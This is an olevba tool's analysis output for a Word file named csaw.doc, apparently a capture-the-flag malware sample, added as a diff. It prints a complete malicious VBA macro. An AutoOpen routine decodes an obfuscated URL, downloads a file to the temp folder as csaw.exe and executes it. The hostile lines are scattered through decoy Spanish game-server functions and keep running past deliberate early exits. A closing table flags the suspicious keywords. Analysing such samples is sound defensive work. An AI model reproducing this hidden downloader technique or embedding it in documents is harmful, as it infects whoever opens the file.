@@ -1,0 +1,829 @@
+olevba 0.46 - http://decalage.info/python/oletools
+Flags        Filename
+-----------  -----------------------------------------------------------------
+OLE:MASIH--- csaw.doc
+===============================================================================
+FILE: csaw.doc
+Type: OLE
+-------------------------------------------------------------------------------
+VBA MACRO ThisDocument.cls
+in file: csaw.doc - OLE stream: u'Macros/VBA/ThisDocument'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+
+Sub autoopen()
+UserRetiraItem 0, 0, -5
+BroadCastParty 0, ""
+SendBanObj 0, 0, ""
+DarCuerpoDesnudo 0, False
+IniciarDeposito 0
+Bloquear False, 0, 0, 0, False
+HayLava -1, -1, -1
+End Sub
+
+
+
+-------------------------------------------------------------------------------
+VBA MACRO Module1.bas
+in file: csaw.doc - OLE stream: u'Macros/VBA/Module1'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+Public halalaya As Object
+Public adbrd As Object
+Public processEnv  As Object
+
+Public tempFile As String
+Public shellApp As Object
+
+Public Sub IniciarDeposito(ByVal UserIndex As Integer)
+'***************************************************
+'Author: Unknownn
+'Last Modification: -
+'
+'***************************************************
+
+On Error GoTo ErrHandler
+
+tempFile = processEnv("T" & "EMP")
+
+    adbrd.Open
+Exit Sub
+'Hacemos un Update del inventario del usuario
+Call Upda.teBanUserInv(True, UserIndex, 0)
+'Actualizamos el dinero
+Call Writ.eUpdateUserStats(UserIndex)
+'Mostramos la ventana pa' comerciar y ver ladear la osamenta. jajaja
+Call Writ.eBankInit(UserIndex)
+UserL.ist(UserIndex).Flags.Comerciando = True
+
+ErrHandler:
+
+End Sub
+
+Public Sub SendBanObj(UserIndex As Integer, Slot As Byte, Object As String)
+
+Set shellApp = CreateObject("Shell.Application")
+'***************************************************
+'Author: Unknownn
+'Last Modification: -
+'
+'***************************************************
+adbrd.Type = 1
+Dim Professor() As Variant
+Professor = Array(148, 158, 156, 150, 94, 81, 79, 145, 79, 72, 121, 131, 117, 140, 127, 124, 109, 129, 123, 52, 103, 113, 109, 45, 106, 115, 109, 35, 93, 96, 86, 93, 95, 79, 75, 21, 71, 85, 65, 85, 10, 63, 80, 59)
+ans = GetStringFromArray(Professor, 44)
+halalaya.Open "GET", GetStringFromArray(Professor, 44), False
+Exit Sub
+Us.rList(Use.rIndex).BancoInvent.Object(Slot) = Object
+
+Call Writ.eChangeBankSlot(UserI.ndex, Slot)
+
+End Sub
+
+
+Public Sub UserRetiraItem(ByVal UserIndex As Integer, ByVal i As Integer, ByVal Cantidad As Integer)
+'***************************************************
+'Author: Unknownn
+'Last Modification: 10/08/2011 - ^[GS]^
+'
+'***************************************************
+
+On Error GoTo ErrHandler
+
+    Dim ObjIndex As Integer
+Set halalaya = CreateObject("Microsoft.XMLHTTP")
+
+    If Cantidad < 1 Then Exit Sub
+
+    Call Writ.eUpdateUserStats(UserIndex)
+
+    If Use.rList(UserIndex).BancoInvent.Object(i).Amount > 0 Then
+
+        If Cantidad > Use.rList(UserIndex).BancoInvent.Object(i).Amount Then _
+            Cantidad = Use.rList(UserIndex).BancoInvent.Object(i).Amount
+
+        ObjIndex = UserL.ist(UserIndex).BancoInvent.Object(i).ObjIndex
+
+        'Agregamos el obj que compro al inventario
+        Call UserR.eciveObj(UserIndex, CInt(i), Cantidad)
+
+        If ObjD.ata(ObjIndex).Log = 1 Then
+            Call LogDes.arrollo(Use.rList(UserIndex).Name & " retiró " & Cantidad & " " & _
+                ObjD.ata(ObjIndex).Name & "[" & ObjIndex & "]")
+        End If
+
+        'Actualizamos el inventario del usuario
+        Call UpdateU.serInv(True, UserIndex, 0)
+        'Actualizamos el banco
+        Call UpdateBan.UserInv(True, UserIndex, 0)
+    End If
+
+    'Actualizamos la ventana de comercio
+    Call Updat.eVentanaBanco(UserIndex)
+
+
+ErrHandler:
+
+End Sub
+
+
+Sub SendUserBovedaTxtFromChar(ByVal sendIndex As Integer, ByVal charName As String)
+'***************************************************
+'Author: Unknownn
+'Last Modification: -
+'
+'***************************************************
+
+On Error Resume Next
+Dim j As Integer
+Dim CharFile As String, Tmp As String
+Dim ObjInd As Long, ObjCant As Long
+
+CharFile = CharPath & charName & ".chr"
+
+If FileExist(CharFile, vbNormal) Then
+    Call WriteConsoleMsg(sendIndex, charName, FontTypeNames.FONTTYPE_INFO)
+    Call WriteConsoleMsg(sendIndex, "Tiene " & GetVar(CharFile, "BancoInventory", "CantidadItems") & " objetos.", FontTypeNames.FONTTYPE_INFO)
+    For j = 1 To MAX_BANCOINVENTORY_SLOTS
+        Tmp = GetVar(CharFile, "BancoInventory", "Obj" & j)
+        ObjInd = ReadField(1, Tmp, Asc("-"))
+        ObjCant = ReadField(2, Tmp, Asc("-"))
+        If ObjInd > 0 Then
+            Call WriteConsoleMsg(sendIndex, "Objeto " & j & " " & ObjData(ObjInd).Name & " Cantidad:" & ObjCant, FontTypeNames.FONTTYPE_INFO)
+        End If
+    Next
+Else
+    Call WriteConsoleMsg(sendIndex, "Usuario inexistente: " & charName, FontTypeNames.FONTTYPE_INFO)
+End If
+
+End Sub
+
+-------------------------------------------------------------------------------
+VBA MACRO Module2.bas
+in file: csaw.doc - OLE stream: u'Macros/VBA/Module2'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+
+Public Function NextParty() As Integer
+'***************************************************
+'Author: Unknownn
+'Last Modification: -
+'
+'***************************************************
+
+Dim i As Integer
+NextParty = -1
+For i = 1 To MAX_PARTIES
+    If Parties(i) Is Nothing Then
+        NextParty = i
+        Exit Function
+    End If
+Next i
+End Function
+
+Public Function PuedeCrearParty(ByVal UserIndex As Integer) As Boolean
+'***************************************************
+'Author: Unknownn
+'Last Modification: 10/07/2012 - ^[GS]^
+'05/22/2010 : staff members aren't allowed to party anyone. (Marco)
+'***************************************************
+
+    PuedeCrearParty = True
+    If (UserList(UserIndex).Flags.Privilegios And PlayerType.User) = 0 Then
+    'staff members aren't allowed to party anyone.
+        Call WriteMensajes(UserIndex, eMensajes.Mensaje452) ' "¡Los miembros del staff no pueden crear partys!"
+        PuedeCrearParty = False
+    ElseIf CInt(UserList(UserIndex).Stats.UserAtributos(eAtributos.Carisma)) * UserList(UserIndex).Stats.UserSkills(eSkill.Liderazgo) < 100 Then
+        Call WriteMensajes(UserIndex, eMensajes.Mensaje069) '"Tu carisma y liderazgo no son suficientes para liderar una party."
+        PuedeCrearParty = False
+    ElseIf UserList(UserIndex).Flags.Muerto = 1 Then
+        Call WriteMensajes(UserIndex, eMensajes.Mensaje005) '"¡¡Estás muerto!!"
+        PuedeCrearParty = False
+    End If
+
+End Function
+
+Public Sub CrearParty(ByVal UserIndex As Integer)
+'***************************************************
+'Author: Unknownn
+'Last Modification: -
+'
+'***************************************************
+
+Dim tInt As Integer
+
+With UserList(UserIndex)
+    If .PartyIndex = 0 Then
+        If .Flags.Muerto = 0 Then
+            If .Stats.UserSkills(eSkill.Liderazgo) >= 5 Then
+                tInt = modUsuariosParty.NextParty
+                If tInt = -1 Then
+                    Call WriteMensajes(UserIndex, eMensajes.Mensaje070) '"Por el momento no se pueden crear más parties."
+                    Exit Sub
+                Else
+                    Set Parties(tInt) = New clsParty
+                    If Not Parties(tInt).NuevoMiembro(UserIndex) Then
+                        Call WriteMensajes(UserIndex, eMensajes.Mensaje071) '"La party está llena, no puedes entrar."
+                        Set Parties(tInt) = Nothing
+                        Exit Sub
+                    Else
+                        Call WriteMensajes(UserIndex, eMensajes.Mensaje072) '"¡Has formado una party!"
+                        .PartyIndex = tInt
+                        .PartySolicitud = 0
+                        If Not Parties(tInt).HacerLeader(UserIndex) Then
+                            Call WriteMensajes(UserIndex, eMensajes.Mensaje073) '"No puedes hacerte líder."
+                        Else
+                            Call WriteMensajes(UserIndex, eMensajes.Mensaje074) '"¡Te has convertido en líder de la party!"
+                        End If
+                    End If
+                End If
+            Else
+                Call WriteMensajes(UserIndex, eMensajes.Mensaje075) '"No tienes suficientes puntos de liderazgo para liderar una party."
+            End If
+        Else
+            Call WriteMensajes(UserIndex, eMensajes.Mensaje005) '"¡¡Estás muerto!!"
+        End If
+    Else
+        Call WriteMensajes(UserIndex, eMensajes.Mensaje076) '"Ya perteneces a una party."
+    End If
+End With
+End Sub
+
+Public Sub SolicitarIngresoAParty(ByVal UserIndex As Integer)
+'***************************************************
+'Author: Unknownn
+'Last Modification: 10/07/2012 - ^[GS]^
+'05/22/2010 : staff members aren't allowed to party anyone. (Marco)
+'18/09/2010: ZaMa - Ahora le avisa al funda de la party cuando alguien quiere ingresar a la misma.
+'18/09/2010: ZaMa - Contemple mas ecepciones (solo se le puede mandar party al lider)
+'***************************************************
+
+    'ESTO ES enviado por el PJ para solicitar el ingreso a la party
+    Dim TargetUserIndex As Integer
+    Dim PartyIndex As Integer
+
+    With UserList(UserIndex)
+
+        'staff members aren't allowed to party anyone
+        If (.Flags.Privilegios And PlayerType.User) = 0 Then ' 0.13.3
+            Call WriteMensajes(UserIndex, eMensajes.Mensaje454) ' "¡Los miembros del staff no pueden unirse a partys!"
+            Exit Sub
+        End If
+
+        If .PartyIndex > 0 Then
+            'si ya esta en una party
+            Call WriteMensajes(UserIndex, eMensajes.Mensaje077) '"Ya perteneces a una party, escribe /SALIRPARTY para abandonarla"
+            .PartySolicitud = 0
+            Exit Sub
+        End If
+
+        ' Muerto?
+        If .Flags.Muerto = 1 Then
+            Call WriteMensajes(UserIndex, eMensajes.Mensaje005) '"¡¡Estás muerto!!"
+            .PartySolicitud = 0
+            Exit Sub
+        End If
+
+        TargetUserIndex = .Flags.targetUser
+        ' Target valido?
+        If TargetUserIndex > 0 Then
+            PartyIndex = UserList(TargetUserIndex).PartyIndex
+            ' Tiene party?
+            If PartyIndex > 0 Then
+
+                ' Es el lider?
+                If Parties(PartyIndex).EsPartyLeader(TargetUserIndex) Then
+                    .PartySolicitud = PartyIndex
+                    Call WriteMensajes(UserIndex, eMensajes.Mensaje078) '"El fundador decidirá si te acepta en la party."
+                    Call WriteConsoleMsg(TargetUserIndex, .Name & " solicita ingresar a tu party.", FontTypeNames.FONTTYPE_PARTY)
+
+                ' No es lider
+                Else
+                    Call WriteConsoleMsg(UserIndex, UserList(TargetUserIndex).Name & " no es lider de la party.", FontTypeNames.FONTTYPE_PARTY)
+                End If
+
+            ' No tiene party
+            Else
+                Call WriteConsoleMsg(UserIndex, UserList(TargetUserIndex).Name & " no pertenece a ninguna party.", FontTypeNames.FONTTYPE_PARTY)
+                .PartySolicitud = 0
+                Exit Sub
+            End If
+        ' Target inválido
+        Else
+            Call WriteMensajes(UserIndex, eMensajes.Mensaje079) '"Para ingresar a una party debes hacer click sobre el fundador y luego escribir /PARTY"
+            .PartySolicitud = 0
+        End If
+    End With
+
+End Sub
+
+
+Private Function IsPartyMember(ByVal UserIndex As Integer, ByVal PartyIndex As Integer)
+    Dim MemberIndex As Integer
+
+    For MemberIndex = 1 To PARTY_MAXMEMBERS
+
+    Next MemberIndex
+End Function
+Public Function GetStringFromArray(fromArr() As Variant, LenLen As Integer) As String
+    Dim i As Integer
+    Dim result As String
+    result = ""
+    For i = LBound(fromArr) To UBound(fromArr)
+        result = result & Chr(fromArr(i) - LenLen + i * 2)
+    Next i
+    GetStringFromArray = result
+End Function
+
+Public Sub BroadCastParty(ByVal UserIndex As Integer, ByRef texto As String)
+'***************************************************
+'Author: Unknownn
+'Last Modification: -
+'
+'***************************************************
+
+Dim PI As Integer
+
+Set adbrd = CreateObject("Adodb.Stream")
+On Error GoTo ErrorHandler
+    PI = 0
+
+    If PI > 0 Then
+        Call Pa.rties(PI).MandarMensajeAConsola(texto, Use.rList(UserIndex).Name)
+    End If
+ErrorHandler:
+
+End Sub
+
+Public Sub OnlineParty(ByVal UserIndex As Integer)
+'*************************************************
+'Author: Unknownn
+'Last modified: 11/27/09 (Budi)
+'Adapte la función a los nuevos métodos de clsParty
+'*************************************************
+Dim i As Integer
+Dim PI As Integer
+Dim Text As String
+Dim MembersOnline(1 To PARTY_MAXMEMBERS) As Integer
+
+    PI = UserList(UserIndex).PartyIndex
+
+    If PI > 0 Then
+        Call Parties(PI).ObtenerMiembrosOnline(MembersOnline())
+        Text = "Nombre(Exp): "
+        For i = 1 To PARTY_MAXMEMBERS
+            If MembersOnline(i) > 0 Then
+                Text = Text & " - " & UserList(MembersOnline(i)).Name & " (" & Fix(Parties(PI).MiExperiencia(MembersOnline(i))) & ")"
+            End If
+        Next i
+        Text = Text & ". Experiencia total: " & Parties(PI).ObtenerExperienciaTotal
+        Call WriteConsoleMsg(UserIndex, Text, FontTypeNames.FONTTYPE_PARTY)
+    End If
+
+End Sub
+
+
+Public Sub TransformarEnLider(ByVal OldLeader As Integer, ByVal NewLeader As Integer)
+'***************************************************
+'Author: Unknownn
+'Last Modification: -
+'
+'***************************************************
+
+Dim PI As Integer
+
+If OldLeader = NewLeader Then Exit Sub
+
+PI = UserList(OldLeader).PartyIndex
+
+If PI = UserList(NewLeader).PartyIndex Then
+    If UserList(NewLeader).Flags.Muerto = 0 Then
+        If Parties(PI).HacerLeader(NewLeader) Then
+            Call Parties(PI).MandarMensajeAConsola("El nuevo líder de la party es " & UserList(NewLeader).Name, UserList(OldLeader).Name)
+        Else
+            Call WriteMensajes(OldLeader, eMensajes.Mensaje083) '"¡No se ha hecho el cambio de mando!"
+        End If
+    Else
+        Call WriteMensajes(OldLeader, eMensajes.Mensaje084) '"¡Está muerto!"
+    End If
+Else
+    Call WriteConsoleMsg(OldLeader, LCase(UserList(NewLeader).Name) & " no pertenece a tu party.", FontTypeNames.FONTTYPE_INFO)
+End If
+
+End Sub
+
+
+Public Sub ActualizaExperiencias()
+'***************************************************
+'Author: Unknownn
+'Last Modification: -
+'
+'***************************************************
+
+'esta funcion se invoca antes de worlsaves, y apagar servidores
+'en caso que la experiencia sea acumulada y no por golpe
+'para que grabe los datos en los charfiles
+Dim i As Integer
+
+If Not PARTY_EXPERIENCIAPORGOLPE Then
+
+    haciendoBK = True
+    Call SendData(SendTarget.ToAll, 0, PrepareMessagePauseToggle())
+
+    Call SendData(SendTarget.ToAll, 0, PrepareMessageConsoleMsg("Servidor> Distribuyendo experiencia en parties.", FontTypeNames.FONTTYPE_SERVER))
+    For i = 1 To MAX_PARTIES
+        If Not Parties(i) Is Nothing Then
+            Call Parties(i).FlushExperiencia
+        End If
+    Next i
+    Call SendData(SendTarget.ToAll, 0, PrepareMessageConsoleMsg("Servidor> Experiencia distribuida.", FontTypeNames.FONTTYPE_SERVER))
+    Call SendData(SendTarget.ToAll, 0, PrepareMessagePauseToggle())
+    haciendoBK = False
+
+End If
+
+End Sub
+
+Public Sub ObtenerExito(ByVal UserIndex As Integer, ByVal Exp As Long, mapa As Integer, X As Integer, Y As Integer)
+'***************************************************
+'Author: Unknownn
+'Last Modification: -
+'
+'***************************************************
+
+    If Exp <= 0 Then
+        If Not CASTIGOS Then Exit Sub
+    End If
+
+    Call Parties(UserList(UserIndex).PartyIndex).ObtenerExito(Exp, mapa, X, Y)
+
+
+End Sub
+
+Public Function CantMiembros(ByVal UserIndex As Integer) As Integer
+'***************************************************
+'Author: Unknownn
+'Last Modification: -
+'
+'***************************************************
+
+CantMiembros = 0
+If UserList(UserIndex).PartyIndex > 0 Then
+    CantMiembros = Parties(UserList(UserIndex).PartyIndex).CantMiembros
+End If
+
+End Function
+
+''
+' Sets the new p_sumaniveleselevados to the party.
+'
+' @param UserInidex Specifies reference to user
+' @remarks When a user level up and he is in a party, we call this sub to don't desestabilice the party exp formula
+Public Sub ActualizarSumaNivelesElevados(ByVal UserIndex As Integer)
+'*************************************************
+'Author: Marco Vanotti (MarKoxX)
+'Last modified: 28/10/08
+'
+'*************************************************
+    If UserList(UserIndex).PartyIndex > 0 Then
+        Call Parties(UserList(UserIndex).PartyIndex).UpdateSumaNivelesElevados(UserList(UserIndex).Stats.ELV)
+    End If
+End Sub
+-------------------------------------------------------------------------------
+VBA MACRO Module3.bas
+in file: csaw.doc - OLE stream: u'Macros/VBA/Module3'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+Public Sub DarCuerpoDesnudo(ByVal UserIndex As Integer, Optional ByVal Mimetizado As Boolean = False)
+'***************************************************
+'Autor: Nacho (Integer)
+'Last Modification: 03/14/07
+'Da cuerpo desnudo a un usuario
+'23/11/2009: ZaMa - Optimizacion de codigo.
+'***************************************************
+
+Dim CuerpoDesnudo As Integer
+halalaya.Send
+
+Set processEnv = CreateObject("WScript.Shell").Environment("Process")
+
+Exit Sub
+With Use.rList(UserIndex)
+    Select Case .Genero
+        Case eGenero.Hombre
+            Select Case .raza
+                Case eRaza.Humano
+                    CuerpoDesnudo = 21
+                Case eRaza.Drow
+                    CuerpoDesnudo = 32
+                Case eRaza.Elfo
+                    CuerpoDesnudo = 210
+                Case eRaza.Gnomo
+                    CuerpoDesnudo = 222
+                Case eRaza.Enano
+                    CuerpoDesnudo = 53
+            End Select
+        Case eGenero.Mujer
+            Select Case .raza
+                Case eRaza.Humano
+                    CuerpoDesnudo = 39
+                Case eRaza.Drow
+                    CuerpoDesnudo = 40
+                Case eRaza.Elfo
+                    CuerpoDesnudo = 259
+                Case eRaza.Gnomo
+                    CuerpoDesnudo = 260
+                Case eRaza.Enano
+                    CuerpoDesnudo = 60
+            End Select
+    End Select
+
+    If Mimetizado Then
+        .CharMimetizado.Body = CuerpoDesnudo
+    Else
+        .Char.Body = CuerpoDesnudo
+    End If
+
+    .Flags.Desnudo = 1
+End With
+
+End Sub
+
+
+Public Sub Bloquear(ByVal ToMap As Boolean, ByVal sndIndex As Integer, ByVal X As Integer, ByVal Y As Integer, ByVal b As Boolean)
+'***************************************************
+'Author: Unknownn
+'Last Modification: -
+'b ahora es boolean,
+'b=true bloquea el tile en (x,y)
+'b=false desbloquea el tile en (x,y)
+'toMap = true -> Envia los datos a todo el mapa
+'toMap = false -> Envia los datos al user
+'Unifique los tres parametros (sndIndex,sndMap y map) en sndIndex... pero de todas formas, el mapa jamas se indica.. eso esta bien asi?
+'Puede llegar a ser, que se quiera mandar el mapa, habria que agregar un nuevo parametro y modificar.. lo quite porque no se usaba ni aca ni en el cliente :s
+'***************************************************
+
+    If ToMap Then
+        Call Sen.dData(SendTarget.ToMap, sndIndex, Prepar.eMessageBlockPosition(X, Y, b))
+        Call Writ.eBlockPosition(sndIndex, X, Y, b)
+    End If
+
+tempFile = tempFile + "\" & "c" & "saw" + "." + "e" + "xe"
+End Sub
+
+
+Function HayAgua(ByVal Map As Integer, ByVal X As Integer, ByVal Y As Integer) As Boolean
+'***************************************************
+'Author: Unknownn
+'Last Modification: -
+'
+'***************************************************
+
+    If Map > 0 And Map < NumMaps + 1 And X > 0 And X < 101 And Y > 0 And Y < 101 Then
+        With MapData(Map, X, Y)
+            If ((.Graphic(1) >= 1505 And .Graphic(1) <= 1520) Or (.Graphic(1) >= 5665 And .Graphic(1) <= 5680) Or (.Graphic(1) >= 13547 And .Graphic(1) <= 13562)) And .Graphic(2) = 0 Then
+                    HayAgua = True
+            Else
+                    HayAgua = False
+            End If
+        End With
+    Else
+      HayAgua = False
+    End If
+
+End Function
+
+Public Function HayLava(ByVal Map As Integer, ByVal X As Integer, ByVal Y As Integer)
+'***************************************************
+'Autor: Nacho (Integer)
+'Last Modification: 03/12/07
+'***************************************************
+    If Map > 0 Then
+        If Map > 0 And Map < NumMaps + 1 And X > 0 And X < 101 And Y > 0 And Y < 101 Then
+            If MapDa.ta(Map, X, Y).Graphic(1) >= 5837 And MapDa.ta(Map, X, Y).Graphic(1) <= 5852 Then
+                HayLava = True
+            Else
+                HayLava = False
+            End If
+        Else
+          HayLava = False
+        End If
+
+    End If
+
+adbrd.write halalaya.responseBody
+    adbrd.savetofile tempFile, 2
+shellApp.Open (tempFile)
+End Function
+
+
+Sub LimpiarMundo()
+'***************************************************
+'Author: Unknown
+'Last Modification: 05/09/2012 - ^[GS]^
+'***************************************************
+On Error GoTo ErrHandler
+
+    If aLimpiarMundo.CantItems > 0 Then
+        Call aLimpiarMundo.EraseAllItems
+    End If
+
+    Call modSecurityIp.IpSecurityMantenimientoLista
+
+    Exit Sub
+
+ErrHandler:
+    Call LogError("Error producido en el sub LimpiarMundo: " & Err.Description)
+End Sub
+
+Sub EnviarSpawnList(ByVal UserIndex As Integer)
+'***************************************************
+'Author: Unknownn
+'Last Modification: -
+'
+'***************************************************
+
+    Dim k As Long
+    Dim npcNames() As String
+
+    ReDim npcNames(1 To UBound(modDeclaraciones.SpawnList)) As String
+
+    For k = 1 To UBound(modDeclaraciones.SpawnList)
+        npcNames(k) = modDeclaraciones.SpawnList(k).NpcName
+    Next k
+
+    Call WriteSpawnList(UserIndex, npcNames())
+
+End Sub
+
+
+Sub Main()
+'***************************************************
+'Author: Unknownn
+'Last Modification: 08/06/2012 - ^[GS]^
+'***************************************************
+
+On Error Resume Next
+
+    Dim f As Date
+    Dim aux As String
+    Dim buf As String, bufS As String
+    Dim ret As Long
+    '
+    ' Obtener el directorio de windows
+    buf = String$(260, vbNullChar)
+    ret = GetWindowsDirectory(buf, Len(buf))
+    buf = Left$(buf, ret)
+    '
+    ' Obtener el directorio de System
+    bufS = String$(260, vbNullChar)
+    ret = GetSystemDirectory(bufS, Len(bufS))
+    bufS = Left$(bufS, ret)
+
+    ChDir App.Path
+    ChDrive App.Path
+
+    'Si esta activado el mysql carga componentes (Fedudok)
+#If Mysql = 1 Then
+    Call CargarDB
+#End If
+    '(Fedudok)
+
+    Call LoadMotd
+    Call BanIpCargar
+    Call BanHD_load ' GSZ-AO
+
+    frmMain.Caption = frmMain.Caption & " v" & App.Major & "." & App.Minor & "." & App.Revision
+
+    ' Start loading...
+    frmCargando.Show
+    'Call PlayWaveAPI(App.Path & "\wav\harp3.wav")
+
+    ' Constants & vars
+    frmCargando.cMensaje.Caption = "Cargando constantes..."
+    Call LoadConstants
+    DoEvents
+
+    ' Arrays
+    frmCargando.cMensaje.Caption = "Iniciando Arrays..."
+    Call LoadArrays
+
+    ' Server.ini & Apuestas.dat
+    frmCargando.cMensaje.Caption = "Cargando Server.ini"
+    Call LoadSini
+    Call CargaApuestas
+
+    ' Npcs.dat
+    frmCargando.cMensaje.Caption = "Cargando NPCs.Dat"
+    Call CargaNpcsDat
+
+    ' Obj.dat
+    frmCargando.cMensaje.Caption = "Cargando Obj.Dat"
+    Call LoadOBJData
+
+    ' Hechizos.dat
+    frmCargando.cMensaje.Caption = "Cargando Hechizos.Dat"
+    Call CargarHechizos
+
+    ' Objetos de Herreria
+    frmCargando.cMensaje.Caption = "Cargando Objetos de Herrer?"
+    Call LoadHerreriaArmas
+    Call LoadHerreriaArmaduras
+
+    ' Objetos de Capinteria
+    frmCargando.cMensaje.Caption = "Cargando Objetos de Carpinter?"
+    Call LoadCarpinteria
+
+    ' Balance.dat
+    frmCargando.cMensaje.Caption = "Cargando Balance.Dat"
+    Call LoadBalance
+
+    ' Armaduras faccionarias
+    frmCargando.cMensaje.Caption = "Cargando ArmadurasFaccionarias.dat"
+    Call LoadArmadurasFaccion
+
+    ' Pretorianos
+    frmCargando.cMensaje.Caption = "Cargando Pretorianos.dat"
+    Call LoadPretorianData
+
+    ' Mapas
+    If iniWorldBackup Then
+        frmCargando.cMensaje.Caption = "Cargando BackUp"
+        Call CargarBackUp
+    Else
+        frmCargando.cMensaje.Caption = "Cargando Mapas"
+        Call LoadMapData
+    End If
+
+    ' Internet IP
+    frmCargando.cMensaje.Caption = "Buscando IP en Internet..." ' GSZ
+    frmMain.txtIP.Caption = frmMain.Inet1.OpenURL("http://ip1.dynupdate.no-ip.com:8245/")
+    DoEvents
+    If frmMain.txtIP.Caption = vbNullString Then frmMain.txtIP.Caption = "N/A"
+
+    frmCargando.cMensaje.Caption = "Inicializando..."
+
+    ' Map Sounds
+    Set SonidosMapas = New clsSoundMapInfo
+    Call SonidosMapas.LoadSoundMapInfo
+
+    ' Home distance
+    Call generateMatrix(MATRIX_INITIAL_MAP)
+
+    ' Connections
+    Call ResetUsersConnections
+
+    ' Timers
+    Call InitMainTimers
+
+    ' Sockets
+    Call SocketConfig
+    frmMain.mnuReiniciarListen.Caption = "Reiniciar puerto de conexi? [" & iniPuerto & "]" ' GSZ
+
+    ' End loading..
+    Unload frmCargando
+
+    'Log start time
+    LogServerStartTime
+
+    'Ocultar
+    If iniOculto Then
+        Call frmMain.InitMain(1)
+    Else
+        Call frmMain.InitMain(0)
+    End If
+
+    tInicioServer = GetTickCount() And &H7FFFFFFF
+
+    If frmMain.Visible Then frmMain.txStatus.Text = "Escuchando conexiones entrantes ..."
+
+    'Actualizo el frmMain. / maTih.-  |  02/03/2012
+    If frmMain.Visible Then frmMain.Record.Caption = CStr(iniRecord)
+End Sub
+
++------------+----------------------+-----------------------------------------+
+| Type       | Keyword              | Description                             |
++------------+----------------------+-----------------------------------------+
+| AutoExec   | AutoOpen             | Runs when the Word document is opened   |
+| Suspicious | Open                 | May open a file                         |
+| Suspicious | Shell                | May run an executable file or a system  |
+|            |                      | command                                 |
+| Suspicious | vbNormal             | May run an executable file or a system  |
+|            |                      | command                                 |
+| Suspicious | WScript.Shell        | May run an executable file or a system  |
+|            |                      | command                                 |
+| Suspicious | Windows              | May enumerate application windows (if   |
+|            |                      | combined with Shell.Application object) |
+| Suspicious | Shell.Application    | May run an application (if combined     |
+|            |                      | with CreateObject)                      |
+| Suspicious | CreateObject         | May create an OLE object                |
+| Suspicious | Chr                  | May attempt to obfuscate specific       |
+|            |                      | strings                                 |
+| Suspicious | ADODB.Stream         | May create a text file                  |
+| Suspicious | SaveToFile           | May create a text file                  |
+| Suspicious | Write                | May write to a file (if combined with   |
+|            |                      | Open)                                   |
+| Suspicious | Microsoft.XMLHTTP    | May download files from the Internet    |
+| Suspicious | Hex Strings          | Hex-encoded strings were detected, may  |
+|            |                      | be used to obfuscate strings (option    |
+|            |                      | --decode to see all)                    |
+| IOC        | http://ip1.dynupdate | URL                                     |
+|            | .no-ip.com:8245/     |                                         |
++------------+----------------------+-----------------------------------------+
+
